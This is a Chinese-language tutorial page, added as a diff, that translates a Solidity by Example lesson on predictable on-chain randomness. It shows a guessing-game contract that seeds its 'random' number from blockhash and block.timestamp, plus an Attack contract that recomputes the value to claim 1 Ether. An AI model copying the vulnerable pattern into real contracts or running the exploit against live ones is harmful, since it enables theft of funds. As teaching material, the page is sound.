@@ -1,0 +1,82 @@
+# 随机数预测
+
+对应英文原页：https://solidity-by-example.org/hacks/randomness
+
+## 漏洞
+
+`blockhash` 和 `block.timestamp` 不是可靠的随机性来源。
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+/*
+注意：无法在 Remix 中使用 blockhash，因此使用 ganache-cli
+
+npm i -g ganache-cli
+ganache-cli
+在 Remix 中将环境切换为 Web3 provider
+*/
+
+/*
+GuessTheRandomNumber 是一个游戏：如果你能猜中由区块哈希和时间戳
+生成的伪随机数，就能赢得 1 Ether。
+
+乍一看，似乎不可能猜到正确数字。
+但让我们看看赢下它有多容易。
+
+1. Alice 部署 GuessTheRandomNumber 并放入 1 Ether
+2. Eve 部署 Attack
+3. Eve 调用 Attack.attack() 并赢得 1 Ether
+
+发生了什么？
+Attack 只需复制计算随机数的代码，就算出了正确答案。
+*/
+
+contract GuessTheRandomNumber {
+    constructor() payable {}
+
+    function guess(uint256 _guess) public {
+        uint256 answer = uint256(
+            keccak256(
+                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
+            )
+        );
+
+        if (_guess == answer) {
+            (bool sent,) = msg.sender.call{value: 1 ether}("");
+            require(sent, "Failed to send Ether");
+        }
+    }
+}
+
+contract Attack {
+    receive() external payable {}
+
+    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
+        uint256 answer = uint256(
+            keccak256(
+                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
+            )
+        );
+
+        guessTheRandomNumber.guess(answer);
+    }
+
+    // 用于检查余额的辅助函数
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+
+## 预防措施
+
+- 不要使用 `blockhash` 和 `block.timestamp` 作为随机性来源
+
+---
+## 关注我们
+[Yanbo的Twitter](https://x.com/Yanbo2004)｜[Web3Club的Twitter](https://twitter.com/Web3ClubCN)
+
+
+[加入我们](https://github.com/Web3-Club/Intro./blob/main/Join%20club.md)
